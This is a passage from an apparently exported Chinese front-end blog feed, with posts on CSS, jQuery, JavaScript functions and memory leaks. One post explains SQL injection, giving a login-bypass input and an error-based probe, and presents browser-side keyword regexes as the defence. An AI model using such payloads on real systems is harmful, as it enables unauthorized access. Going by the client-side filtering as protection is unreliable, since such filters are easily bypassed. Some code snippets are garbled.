dotted&#125;a:hover,a:active&#123;outline:0&#125;a,a:visited,a:active&#123;text-decoration:none;color:#fff;-webkit-transition:all .3s ease-in-out&#125;a:hover,.glow&#123;color:#ff0;text-shadow:0 0 10px #ff0&#125;&nbsp;60、带CSS3特色的横幅显示123.featureBanner&#123;position:relative;margin:20px&#125;.featureBanner:before&#123;content:"Featured";position:absolute;top:5px;left:-8px;padding-right:10px;color:#232323;font-weight:bold;height:0px;border:15px solid #ffa200;border-right-color:transparent;line-height:0px;box-shadow:-0px 5px 5px -5px #000;z-index:1&#125;.featureBanner:after&#123;content:"";position:absolute;top:35px;left:-8px;border:4px solid #89540c;border-left-color:transparent;border-bottom-color:transparent&#125;&nbsp;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>CSS技巧代码段</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript中变量的有效性判断]]></title>
    <url>%2F2016%2F04%2F20%2Fjavascript%E4%B8%AD%E5%8F%98%E9%87%8F%E7%9A%84%E6%9C%89%E6%95%88%E6%80%A7%E5%88%A4%E6%96%AD%2F</url>
    <content type="text"><![CDATA[JavaScript 语言设计的不严谨，有时候很容易把人给搞晕，比如说这个变量有效性判断。先举几个例子：想要理解为什么得出上面的结果，首先得明白 undefined 和 null 在 JavaScript 中所表示的不同含义。这里借用下阮一峰老师博客中的一个结论:null和undefined基本是同义的，只有一些细微的差别。null表示”没有对象”，即该处不应该有值。典型用法是：（1） 作为函数的参数，表示该函数的参数不是对象。（2） 作为对象原型链的终点。undefined表示”缺少值”，就是此处应该有一个值，但是还没有定义。典型用法是：（1）变量被声明了，但没有赋值时，就等于undefined。（2) 调用函数时，应该提供的参数没有提供，该参数等于undefined。（3）对象没有赋值的属性，该属性的值为undefined。（4）函数没有返回值时，默认返回undefined。在 Java 中，if 条件中必须使用 boolean 表达式, 所以使用 JavaScript 时，也会习惯性的认为如此。实际上，JavaScript 中 null,undefined,0,””,false 作为 if 的条件的时候，都被认为是 false 。所以，在判断变量时，可以用以下几种方式:1、精确判断一个变量是否为 undefined2、精确判断一个变量是否为 null3、判断一个变量是否为 null 或 undefined4、判断值是否有效, 可以直接在if表达式中使用变量名称, 我常用来判断一个输入框值是否有效(注意: 如果变量值为0, 会被当作无效)]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JavaScript中变量的有效性判断</tag>
        <tag>undefined 和 null区别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十条jQuery代码显著提升Web开发效率]]></title>
    <url>%2F2016%2F04%2F20%2F%E5%8D%81%E6%9D%A1jquery%E4%BB%A3%E7%A0%81%E6%98%BE%E8%91%97%E6%8F%90%E5%8D%87web%E5%BC%80%E5%8F%91%E6%95%88%E7%8E%87%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;JQuery是继prototype之后又一个优秀的Javascript库。它是轻量级的js库 ，它兼容CSS3，还兼容各种浏览器（IE 6.0+, FF 1.5+, Safari 2.0+, Opera 9.0+），jQuery2.0及后续版本将不再支持IE6/7/8浏览器。jQuery使用户能更方便地处理HTML（标准通用标记语言下的一个应用）、events、实现动画效果，并且方便地为网站提供AJAX交互。jQuery还有一个比较大的优势是，它的文档说明很全，而且各种应用也说得很详细，同时还有许多成熟的插件可供选择。jQuery能够使用户的html页面保持代码和html内容分离，也就是说，不用再在html里面插入一堆js来调用命令了，只需要定义id即可。以下十项jQuery示例可以帮助大家的Web设计项目顺利实现效率提升。检测IE浏览器&emsp;&emsp;在进行CSS设计时，IE浏览器对开发者及设计师而言无疑是个麻烦。尽管IE6的黑暗时代已经过去，IE浏览器家族的人气亦在不断下滑，但我们仍然有必要对其进行检测。当然，以下片段亦可用于检测其它浏览器。12345$(document).ready(function() &#123; if (navigator.userAgent.match(/msie/i) )&#123; alert('I am an old fashioned Internet Explorer'); &#125; &#125;);&nbsp;平滑滚动至页面顶部&emsp;&emsp;以下是jQuery最为常见的一种实现效果：点击一条链接以平滑滚动至页面顶部。虽然没什么新鲜感可言，但每位开发者几乎都用得上。1234$("a[href='#top']").click(function() &#123; $("html, body").animate(&#123; scrollTop: 0 &#125;, "slow"); return false; &#125;);&nbsp;保持始终处于顶部&emsp;&emsp;以下代码片段允许某一元素始终处于页面顶部。可以想见，其非常适合处理导航菜单、工具栏或者其它重要信息。1234567891011121314151617$(function()&#123; var $win = $(window) var $nav = $('.mytoolbar'); var navTop = $('.mytoolbar').length &amp;amp;&amp;amp; $('.mytoolbar').offset().top; var isFixed=0; processScroll() $win.on('scroll', processScroll) function processScroll() &#123; var i, scrollTop = $win.scrollTop() if (scrollTop &gt;= navTop &amp;amp;&amp;amp; !isFixed) &#123; isFixed = 1 $nav.addClass('subnav-fixed') &#125; else if (scrollTop &lt;= navTop &amp;amp;&amp;amp; isFixed) &#123; isFixed = 0 $nav.removeClass('subnav-fixed') &#125; &#125;&nbsp;替换html标签jQuery能够非常轻松地实现html标签替换，而这也将为我们带来更多新的可能。123$('li').replaceWith(function()&#123; return $(&lt;span class="string"&gt;"&lt;div/&gt;"&lt;/span&gt;).append($(&lt;span class="keyword"&gt;this&lt;/span&gt;).contents());&#125;);检测屏幕宽度&emsp;&emsp;现在移动设备的人气几乎已经超过了传统计算机，因此对小型屏幕的尺寸进行检测就变得非常重要。幸运的是，我们可以利用jQuery轻松实现这项功能。12345var responsive_viewport = $(window).width(); /* if is below 481px */ if (responsive_viewport &lt; 481) &#123; alert('Viewport is smaller than 481px.'); &#125; /* end smallest screen */自动修复损坏图片&emsp;&emsp;如果大家的站点非常庞大而且已经上线数年，那么其中或多或少会出现图片损坏的情况。这项功能可以检测损坏图片并根据我们的选择加以替换。123$('img').error(function()&#123; $(this).attr('src', 'img/broken.png'); &#125;);检测复制、粘贴与剪切操作&emsp;&emsp;利用jQuery，大家可以非常轻松地检测到选定元素的复制、粘贴与剪切操作。1234567891011$("#textA").bind('copy', function() &#123; $('span').text('copy behaviour detected!') &#125;); $("#textA").bind('paste', function() &#123; $('span').text('paste behaviour detected!') &#125;); $("#textA").bind('cut', function() &#123; $('span').text('cut behaviour detected!') &#125;);自动为外部链接添加target=“blank”属性&emsp;&emsp;在链接至外部站点时，大家可能希望使用target=”blank”属性以确保在新的选项卡中打开页面。问题在于，target=”blank”属性并未经过W3C认证。jQuery能够帮上大忙：以下片段能够检测当前链接是否指向外部，如果是则自动为其添加target=”blank”属性。1234var root = location.protocol + '//' + location.host; $('a').not(':contains(root)').click(function()&#123; this.target = "_blank"; &#125;);悬停时淡入/淡出又是另一项“经典”效果，大家可以利用以下片段随时加以运用。12345678$(document).ready(function()&#123; $(".thumbs img").fadeTo("slow", 0.6); // This sets the opacity of the thumbs to fade down to 60% when the page loads $(".thumbs img").hover(function()&#123; $(this).fadeTo("slow", 1.0); // This should set the opacity to 100% on hover &#125;,function()&#123; $(this).fadeTo("slow", 0.6); // This should set the opacity back to 60% on mouseout &#125;); &#125;);禁用文本/密码输入中的空格&emsp;&emsp;无论是电子邮件、用户名还是密码，很多常见字段都不需要使用空格。以下代码能够轻松禁用选定输入内容中的全部空格。12345$('input.nospace').keydown(function(e) &#123; if (e.keyCode == 32) &#123; return false; &#125; &#125;);]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>提升jQuery开发效率</tag>
        <tag>提升Web开发效率</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端js防止SQL注入]]></title>
    <url>%2F2016%2F04%2F12%2F%E5%89%8D%E7%AB%AFjs%E9%98%B2%E6%AD%A2sql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[SQL注入攻击的总体思路：&emsp;&emsp;发现SQL注入位置；判断服务器类型和后台数据库类型；确定可执行情况对于有些攻击者而言，一般会采取sql注入法。下面我也谈一下自己关于sql注入法的感悟。注入法：&emsp;&emsp;从理论上说，认证网页中会有型如：select * from admin where username=&#39;XXX&#39; and password=&#39;YYY&#39; 的语句，若在正式运行此句之前，如果没有进行必要的字符过滤，则很容易实施SQL注入。如在用户名文本框内输入：abc’ or 1=1– 在密码框内输入：123 则SQL语句变成：select * from admin where username=&#39;abc’ or 1=1 and password=&#39;123’ 不管用户输入任何用户名与密码，此语句永远都能正确执行，用户轻易骗过系统，获取合法身份。猜解法：&emsp;&emsp;基本思路是：猜解所有数据库名称，猜出库中的每张表名，分析可能是存放用户名与密码的表名，猜出表中的每个字段名，猜出表中的每条记录内容。还有一种方式可以获得你的数据库名和每张表的名。就是通过在形如：http://www. .cn/news?id=10’的方式来通过报错获得你的数据库名和表名！前端js防止注入解决办法1.URL地址防注入：123456789//过滤URL非法SQL字符var sUrl=location.search.toLowerCase();var sQuery=sUrl.substring(sUrl.indexOf("=")+1);re=/select|update|delete|truncate|join|union|exec|insert|drop|count|'|"|;|&gt;|&lt;|%/i;if(re.test(sQuery))&#123; alert("请勿输入非法字符"); location.href=sUrl.replace(sQuery,"");&#125;2.输入文本框防注入：123456789101112//防止SQL注入function AntiSqlValid(oField )&#123; re= /select|update|delete|exec|count|'|"|=|;|&gt;|&lt;|%/i; if ( re.test(oField.value) ) &#123; //alert("请您不要在参数中输入特殊字符和SQL关键字！"); //注意中文乱码 oField.value = "; oField.className="errInfo"; oField.focus(); return false;&#125;在需要防注入的输入文本框添加如下方法1txtName.Attributes.Add("onblur","AntiSqlValid(this)");//防止Sql脚本注入]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JS代码防止SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS的px值转rem值的Sublime Text 3自动完成插件]]></title>
    <url>%2F2016%2F04%2F12%2Fcss%E7%9A%84px%E5%80%BC%E8%BD%ACrem%E5%80%BC%E7%9A%84sublime-text-3%E8%87%AA%E5%8A%A8%E5%AE%8C%E6%88%90%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[现在普遍移动端开发都是使用rem来进行开发，但是使用rem开发有一个痛病，就是写CSS的时候都需要通过px转化成rem，那么今天就给大家介绍一款SublimeText3的一款自动化转换px到rem的插件-CSSREM。先上插件效果图：这样就可以安心的按px写，然后一回车转换成rem啦！安装下载本项目进入packages目录：Sublime Text -&gt; Preferences -&gt; Browse Packages…复制下载的cssrem目录到刚才的packges目录里。重启Sublime Text。配置参数参数配置文件：Sublime Text -&gt; Preferences -&gt; Package Settings -&gt; cssrempx_to_rem - px转rem的单位比例，默认为40。max_rem_fraction_length - px转rem的小数部分的最大长度。默认为6。available_file_types - 启用此插件的文件类型。默认为：[“.css”, “.less”, “.sass”]。点击下载&nbsp;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>CSSREM</tag>
        <tag>CSS的px值转rem值的Sublime Text 3自动完成插件</tag>
        <tag>自动化转换px到rem</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让文本框或div具备插入表情功能 - jqueryemoji表情插件]]></title>
    <url>%2F2016%2F04%2F07%2F%E8%AE%A9%E6%96%87%E6%9C%AC%E6%A1%86%E6%88%96div%E5%85%B7%E5%A4%87%E6%8F%92%E5%85%A5%E8%A1%A8%E6%83%85%E5%8A%9F%E8%83%BD-jqueryemoji%E8%A1%A8%E6%83%85%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[插件描述：&emsp;&emsp;jQuery-emoji 让文本框或可编辑div具备插入表情功能。 Let textarea or editable div has ability to insert emoji.功能 features:&emsp;&emsp;支持给textarea或可编辑div加上表情功能，自动识别元素类型。如果是textarea，则选择表情后插入表情代码，如果是可编辑div，则直接插入表情图片。支持自定义表情代码的格式。支持将表情代码转换为表情图片。支持多组表情并提供tab切换。示例已带有百度贴吧和qq高清2套表情。同一页面支持多个表情实例。插件效果图：查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jqueryemoji表情插件</tag>
        <tag>让文本框或div具备插入表情功能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery滑动解锁插件SlideUnlock]]></title>
    <url>%2F2016%2F04%2F07%2Fjquery%E6%BB%91%E5%8A%A8%E8%A7%A3%E9%94%81%E6%8F%92%E4%BB%B6slideunlock%2F</url>
    <content type="text"><![CDATA[插件描述：基于jQuery的滑动解锁插件SlideUnlock插件效果图：htmlclass="slideunlock-wrapper">123456 &lt;input type=&quot;hidden&quot; value=&quot;&quot; class=&quot;slideunlock-lockable&quot;/&gt; &lt;div class=&quot;slideunlock-slider&quot;&gt; &lt;span class=&quot;slideunlock-label&quot;&gt;&lt;/span&gt; &lt;span class=&quot;slideunlock-lable-tip&quot;&gt;Slide to unlock!&lt;/span&gt; &lt;/div&gt;&lt;/div&gt;css123456789101112131415161718192021222324252627282930313233343536 width: 360px; position: relative; padding: 50px; background: #ECF0F1; margin: 0 auto;&#125;.slideunlock-slider&#123; padding:20px; position: relative; border-radius: 2px; background-color: #FDEB9C; overflow: hidden; text-align: center;&#125;.slideunlock-slider.success&#123; background-color: #E5EE9F;&#125;.slideunlock-label&#123; width: 40px; position: absolute; left: 0; top: 0; height: 100%; background: #E67E22; z-index: 999; border-radius: 2px; cursor: pointer;&#125;.slideunlock-label-tip&#123; z-index: 9;&#125;@media screen and (max-width: 640px) &#123; .slideunlock-wrapper&#123; width: 64%; &#125;&#125;JavaScriptdepend on jQuery12345678910111213141516171819202122232425&lt;script type="text/javascript" src="js/jquery.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/jquery.slideunlock.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt; $(function () &#123; var slider = new SliderUnlock(".slideunlock-slider", &#123; labelTip: "滑动解锁", successLabelTip: "解锁成功", duration: 200 // 动画效果执行时间，默认200ms &#125;, function()&#123; alert('success'); &#125;, function()&#123; $(".warn").text("index:" + slider.index + "， max:" + slider.max + ",lableIndex:" + slider.lableIndex + ",value:" + $(".slideunlock-lockable").val() + " date:" + new Date().getUTCDate()); &#125;); slider.init(); $("#reset-btn").on('click', function()&#123; slider.reset(); &#125;); &#125;)&lt;/script&gt;var slider = new SliderUnlock(element, options, success, always);slider.init();// element is required and right. id or class or any identifying which can be loaded by jquery.// if you dont want to give options, please give a null object, like this -- &#123;&#125;//If you need to support mobile，Please add jQuery mobile plugin：&lt;script type="text/javascript" src="js/jquery.mobile.min.js"&gt;&lt;/script&gt;&nbsp;查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jQuery滑动解锁插件</tag>
        <tag>SlideUnlock</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript函数探索与总结]]></title>
    <url>%2F2016%2F04%2F07%2Fjavascript%E5%87%BD%E6%95%B0%E6%8E%A2%E7%B4%A2%E4%B8%8E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[知道大家比较喜欢看那种“某某效果”那样的文章，毕竟不费什么时间，几眼就看完了。首页上大半也都是这样的文章。本人不擅长写效果，还是献一篇长文。写了很长时间的，例子没敢举复杂的，实现也是用最简单的写法。点到为止，是一篇知识由厚到薄个人总结篇。在js中函数是非常重要，本文尝试用组合学的观点，来推导函数中常见概念。这里可以做一点保证，从头看到尾后，各种概念会有一种“就是这么回事儿”和“原来如此！”的感觉，简约而不简单。装备准备篇1.函数是干什么用的？函数主要有三种作用：1.封装逻辑这个可以说，在所有语言里，函数最初的意义，不用多说，就是可复用代码块的封装，可以调用。2.提供作用域作用域是啥呢？指的是变量的可见性问题。众所周知，js中是没有块儿级作用域。一般语言中变量作用域，也有全局作用域和局部作用域之分。而在js中函数是提供作用域的最小单位。3.可以作为构造函数js是一门基于原型的语言，而又可以通过new操作符，来达到基于类语言那种使用方式。在js中构造函数的责任，就落到函数本身上了。2.函数是一等公民！想必你一定听过这样一句话儿，在js中一切都是对象。今天也要记住下面这句话，在js中一切都是值。没错！你没听错。原因就是函数被设计成了一等对象。那什么是一等对象呢？使用一等对象就想可以使用值那样！0.函数可以没有名字。1(function()&#123;&#125;)();1.函数可以像数字那样可以储存为变量。1fun = function()&#123;&#125;;2.函数可以像数字那样可以储存在某个结构中。12var fun = [1, function()&#123;&#125;];var fun2 = &#123;x: function()&#123;&#125;&#125;;3.函数可以像数字那样可以作为函数的参数。123var a = function()&#123;&#125;;var b = function(fun)&#123; fun() &#125;;b(a);4.函数可以像数字那样可以作为函数的返回值1var a = function()&#123; return function()&#123;&#125; &#125;;5.函数可以像数字那样动态创建出来。12+3*(function()&#123;&#125;)();至于一等对象，在js中还有吗？有的，[]是，{}是。由此看来函数被设计成了一种数据类型，没神马大惊小怪的。（”undefined”、 “boolean”、”string”、”number”、”object”和”function”）所以我们要记住这句话，在js中一切都是对象又都是值。真是既对立又统一，这里问候一下马克思爷爷。3.另外还需准备函数相关材料arguments, this, call, apply这些是初等材料，上网随便搜搜，都有的。本网站类似的文章，可谓不计其数，我竟然也写了几篇。。。4.丢掉包袱我们要丢掉性能的相关考虑,不然会错过很多美景。起航篇1.函数基本雏形123456var fun = function(a, b) &#123; console.log(arguments); console.log(this); return a + b;&#125;;fun(1, 2);可以说是函数的最简单的例子。这里稍微说一下this，打印的是全局对象，比如在浏览器中window。严格模式下，是undefined。不信你可以加句”use strict”，调试一下看看。2.以函数为参数jquery用多了，这个很好理解的。我们以数组的es5中方法，来举例比如1[1, 2, 3].forEach(alert);看起来怪怪的，alert是函数，做为参数传进来，然后调用，分别弹出1、2、3。其实也没啥不好理解的。换成如下写法呢？1[1, 2, 3].forEach(function(value)&#123; alert(value) &#125;);是不是也没问题。3.以函数为返回值12345var getAlert = function() &#123; return alert;&#125;;var myAlert = getAlert();myAlert(1);如你所料能弹出结果1。如果getAlert把改成如下的呢？我们应该也认识的。12345var getAlert = function() &#123; return function(value) &#123; alert(value); &#125;;&#125;;看到这里，你恐怕会想，好简单那。知道你不是夸我文章写得好清楚，而是说这些东西，谁不知道，还至于写篇文章吗？哈哈，老姚的文章从来都是由易到难的。ok，我们下来开始搭积木，就由这些浅显的东西，来搭一段旅程，看看有什么风景。4.闭包我们来看看上面那个getAlert，恩，这是个函数。运行过后，返回一个函数没问题。稍微稍微复杂一点12345678var fun = function() &#123; var x = 0; return function() &#123; alert(x); &#125;;&#125;;var f = fun();f();恩，弹出0没问题。别小看这么就这么简单一段代码。就是闭包。f调用，是一个函数调用，里面遇到一个x，浏览器得找到这个变量。浏览器是按照就近原则来找的，x=0，没问题的。再稍微改写下，123456789var fun = function() &#123; var x = 0; return function() &#123; alert(++x); &#125;;&#125;;var f = fun();f();f();分别弹出的是1和2，为啥都不是1呢？他相当于如下的代码123456var x = 0;var f = function()&#123; alert(++x);&#125;;f();f();如果这个能理解，那么上面那个闭包就能理解。相当于浏览器给f开辟一个空间存储了x的值。如果，换种方式调用呢？12345678910var fun = function() &#123; var x = 0; return function() &#123; alert(++x); &#125;;&#125;;var f = fun();f();var g = fun();g();此时两次都是弹出1的。原因是啥呢？因为fun返回是两个函数，浏览器存了两次副本。相当于如下代码123456var x1 = 0;var f = function()&#123; alert(++x1) &#125;;var x2 =0;var g = function()&#123; alert(++x2) &#125;;f();g();这里讲了一下闭包（可以把返回那个函数称为闭包）。其实我以前写过闭包的文章，这里重复是为了保持思维的连贯和为后续做准备。所以有必要再重申一下产生闭包的三个条件1.调用的函数是内部声明2.调用的函数是在声明位置函数之外进行调用3.调用的函数引用外部变量。如下的函数，就不是闭包，会报错的。12345678910var fn = function() &#123; alert(++x);&#125;;var fun = function() &#123; var x = 0; return fn;&#125;;var f = fun();f();继续看12345678var fun = function(x) &#123; return function() &#123; alert(++x); &#125;;&#125;;var f = fun(0);f();f();这个东西是不是闭包呢,是的。满足那三个条件。再看12345678var fun = function(x) &#123; return function(x) &#123; alert(++x); &#125;;&#125;;var f = fun(0);f(1);f(1);这个就不是，因为函数引用的x是内层的x（形参）不是外层的。闭包的概念讲完了，你说我们的旅程还得向那走呢？不是组合学吗？假如alert是一个传进来的函数怎么办呢？123456789101112var sum = function(x, y)&#123; alert(x + y) &#125;var fun = function(call) &#123; var x = 0, y =0; return function() &#123; x++; y++; call(x, y); &#125;;&#125;;var f = fun(sum);f();f();ok,弹出的果然是2和4。恩，确实是闭包。但是从这里可以引进一段新的旅程。5.柯里化1234567var curry = function(fun) &#123;return function(arg) &#123;fun(arg);&#125;;&#125;;var myAlert = curry(alert);myAlert(1);看着没神马鸟用啊,绕了一圈，不还是alert出1吗。有用处的。前几天回答一个帖子就用到了这个。能把函数的多个实参，限制成一个参数。多的这里就不提了。我们还是继续研究研究柯里化。上述代码稍微变化一下12345678910111213var curry = function(fun)&#123; var x = 60; return function(y)&#123; return fun(x,y); &#125;;&#125;;var sum = function(x, y)&#123; return x + y&#125;;var sum60 = curry(sum);sum60(5);//=&gt;65var devide = function(x, y)&#123;return x / y&#125;;var devide60 = curry(devide);devide60(5);//=&gt;12可以看出柯里化的好处了吗？由一个sum函数就能创建出一个sum60函数。由一个devide函数能创建出一个devide60来。总体来说curry化，是一个由函数构建函数的工具。我不想为限定为60呢，待限定的数字是否可以作为参数传进来12345678var curry = function(fun, x)&#123; return function(y)&#123; return fun(x,y); &#125;;&#125;;var sum = function(x, y)&#123; return x + y&#125;;var sum60 = curry(sum,60);sum60(5);//=&gt;65我想由一个devide创建出来一个devideBy60的函数呢？也可以代码如下：12345var curry = function(fun, x)&#123; return function(y)&#123; return fun(y,x); &#125;;&#125;;这就涉及到一个左右的问题了。稍后会讲。下来我们针对多参数，来说说横向展开和纵向展开的问题。横向展开,以4个参数为例12345var curry = function(fun,x,y)&#123; return funciont(z,w)&#123; return fun(x,z,y,w); &#125;&#125;像这种写法，能写出很多种。按概念来说，其实这种横向展开写法，并不是currying化。但我们要关注的是本质。本质是啥呢？本质是延迟参数的传递。至于你管这个函数叫什么都无所谓。我这里也称为currying化。到时，怕你看其他书籍后，回头说老姚，你就瞎忽悠。哈哈。继续看例子。关于横向展开的，其中有一种是我们bind的模拟12345var bind = function(fun,context)&#123; return function(args)&#123; return fun.apply(context, args); &#125;&#125;同样，也可以写一种占位符方式的，这种方式是比较实用的。这里用_来占位1234567891011121314151617181920var _ = &#123;&#125;;//只要是引用，保证不报错就行var curry = function(fun)&#123; var rest = [].slice.call(arguments, 0); rest.shift();//rest = [1, _, 3, _] return function()&#123; var args = [].slice.call(arguments, 0);//args = [2, 4] var finalArgs = rest.map(function(value, index)&#123; if(value === _)&#123; return args.shift(); &#125; return value; &#125;);//finalArgs = [1, 2, 3, 4] return fun.apply(this,finalArgs); &#125;&#125;var fun = function(a, b, c, d)&#123; alert("" + a + b + c + d);&#125;var f1 = curry(fun, 1, _, 3, _);f1(2,4);//=&gt;1234上面代码看起来比较复杂而已，一行行看下来，应该是能看懂的。这里只是一个简单的实现，没有考虑太多。call和apply以及[].map方法，我假设你已经会了。纵向展开，3个参数为例1234567891011121314var curry = function(fun) &#123; return function(z) &#123; return function(y)&#123; return function(x)&#123; return fun(x,y,z); &#125; &#125; &#125;;&#125;;var sum = function(x, y, z)&#123; return x + y +z;&#125;; var r = curry(sum)(5)(10)(15);alert(r);//=&gt;30上面这个curry化是从右向左展开的。如果改成return fun(z,y,x)，就是从左向右展开。我们来看看curry(sum)(5)(10)(15),这个调用，是否很有感觉？？？我知道你现在想说啥？“然而并无卵用”，我猜对了吗。如果参数是函数的话，我们其实可以看出curry化，是一种形式更语义化的调用。至于例子嘛，我还没想好，以后可能会补上。关于参数和返回值相关内容铺垫地差不多了。下来我们主要来瞧瞧所有参数都是函数，那会怎么样？6.函数组合便于分析，先举一个例子123456789var sum = function(x, y) &#123; return x + y;&#125;;var minus = function(x, y) &#123; return x - y;&#125;;var power = function(x) &#123; return x * x;&#125;;如果我们想先做和，然后再平方呢，我们怎么写。调用如下，1power(sum(1, 2))//=&gt;9我们可以构建一个和平方函数sumPower123var sumPower = function(x, y)&#123; return power(sum(x, y));&#125;;恩，这可以说是一种最直接的方式。power(sum(1,2))这种调用在数学上可以看做是两个函数的乘积。即函数组合，变成一个新函数。这种写法，是比较直接，但是不通用。比如我还想要minusPower，难道在重新写一遍。所以我们要重新审视一遍那段代码。因为函数可以当参数传，我是不是可一遍把power和sum传进来呢？可以直接改写如下1234567var getSumPower = function(power, sum) &#123; return function(x, y)&#123; power(sum(x, y)) &#125;;&#125;;sumPower = getSumPower(power, sum);sumPower(1, 2);所以现在我们的任务是把getSumPower改成一个通用的函数，以便我们不仅能获取sumPower，还能获取minusPower。这里我得实现一个组合函数compose，能实现如下效果12var newfunc = compose(f, g, h);newfunc(x)&lt;=&gt;f(g(h(x)))尝试实现如下：12345678910compose = function() &#123; var args = arguments; var start = args.length - 1; return function() &#123; var i = start; var result = args[start].apply(this, arguments); while (i--) result = args[i].call(this, result); return result; &#125;;&#125;;实现原理还是很简单的，一行行看下来就能看明白了。不用我说了吧，说也是照着代码念一遍而已。看过我underscore源码分析系列的同学能知道，你这哪是尝试实现，你这就是原封不动地抄来的好嘛。真不骗你这个函数我敲过n遍了，都能背下来了。使用如下，12var sumPower = compose(power, sum);var minusPower = compose(power, minus);ok,关于组合这道风景线，我们先到此打住。如果从数学的角度去分析这个问题。比如从满足结合性和交换性的角度，即半群理论来产开此问题。估计又能写一篇文章了。f(g(h(x)))从这个调用来看，让人不由得想到管道这个概念。7.管道管道目的也是一个函数运行完后把返回值扔给下个函数当初始值。也是传递接力棒。而管道跟组合关注点不一样。组合关注的是由函数f、g和h怎么组成一个新函数。而管道关注是流程，是否一层层调用下去。实现如下12345var pipeline = function(initValue) &#123; var args = [].slice.call(arguments, 0); args.shift(); return args.reduce(function(prev, next)&#123; return next(prev) &#125;, initValue);&#125;;使用如下：function(x)&#123; return x * 2; &#125;, function()&#123;return x * 3&#125;);123456789```最后一部分讲一下链式调用。### **8.链式法则**说到链式法则，恐怕大家会想，这个我知道，不就是方法最后返回this嘛。比如jq```javascript$(&apos;&lt;div&gt;&lt;/div&gt;&apos;).css(&#123; height: &apos;40px&apos;&#125;).attr(&apos;id&apos;,&apos;newDiv&apos;).appendTo(&apos;body&apos;);关于这种实现略举一例子123456789var f = function(args)&#123; if(!(this instanceof f)) return new f(args);&#125;;f.prototype = &#123; fun1: function()&#123; return this; &#125;, fun2: function()&#123; return this; &#125;&#125;var instance = f();instance.fun1().fun2();稍微说一下，看到构造函数里的if了吗？说明函数调用可以不new，内部也会new的。这种方式被称为稳妥（安全）构造函数。链式法则的链是什么？就是点运算符。一般常说的链式法则指的是点儿之前的对象，是同一个对象。而我这里要提的是一般情况下的链式调用.比如如下这种方式的12var getArray = function(x, y)&#123; return [x, y] &#125;getArray(1,2).map(function(x)&#123; return x * x &#125;).forEach(alert);这种代码风格，有点流水线的风格。既然是点运算符嘛，那得要求返回值是对象才行的。我们假设链式调用形式长成这样的：1object.fun1().fun2().fun3()我们用数组reduce来尝试模拟"fun2", "fun3"].reduce(function(prev, next)&#123;12 return prev[next]();&#125;, obj);上面实现是没有考虑参数的问题，所以得有个储存结构存下相关数据且看实现1234567891011121314151617181920212223var chain = function(obj) &#123; if(!(this instanceof chain)) return new chain(obj); this.start = obj; this.data = [];&#125;;chain.prototype = &#123; link: function(methodName)&#123; var args = [].slice.call(arguments, 0); args.shift(); this.data.push(&#123; name: methodName, args: args &#125;); return this; &#125;, run: function()&#123; return this.data.reduce(function(prev, next)&#123; var name = next.name; var args = next.args; return prev[name].apply(prev, args); &#125;, this.start); &#125;&#125;;大致看一下代码，link是存储，run是整体调用。使用方式,如下：1234chain([1,2,3]).link('map', function(x)&#123; return x * x &#125;).link('forEach', alert).run();这跟直接使用1[1,2,3].map(function(x)&#123; return x * x &#125;).forEach(alert)有什么区别呢？chain是一种惰性链。比较懒的，你调用run时我才运行。也就是说，我们可以一直拼接链下去，直到你不想拼了，最后run一下就链式调用了。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>javascript函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript内存泄漏问题总结]]></title>
    <url>%2F2016%2F04%2F07%2Fjavascript%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Js内存泄漏及解决方案在IE下的JS编程中，以下的编程方式都会造成即使关闭IE也无法释放内存的问题，下面分类给出：1、给DOM对象添加的属性是一个对象的引用。范例：12var MyObject = &#123;&#125;;document.getElementById('myDiv').myProp = MyObject;解决方法：在window.onunload事件中写上: document.getElementById(‘myDiv’).myProp = null;&nbsp;2、DOM对象与JS对象相互引用。范例：12345function Encapsulator(element) &#123;this.elementReference = element;element.myProp = this;&#125;new Encapsulator(document.getElementById('myDiv'));解决方法：在onunload事件中写上: document.getElementById(‘myDiv’).myProp = null;&nbsp;3、给DOM对象用attachEvent绑定事件。范例：12function doClick() &#123;&#125;element.attachEvent("onclick", doClick);解决方法：在onunload事件中写上: element.detachEvent(‘onclick’, doClick);&nbsp;4、从外到内执行appendChild。这时即使调用removeChild也无法释放。范例：1234var parentDiv = document.createElement("div");var childDiv = document.createElement("div");document.body.appendChild(parentDiv);parentDiv.appendChild(childDiv);解决方法：从内到外执行appendChild:1234var parentDiv = document.createElement("div");var childDiv = document.createElement("div");parentDiv.appendChild(childDiv);document.body.appendChild(parentDiv);&nbsp;5、反复重写同一个属性会造成内存大量占用(但关闭IE后内存会被释放)。范例：123for(i = 0; i &lt; 5000; i++) &#123;hostElement.text = 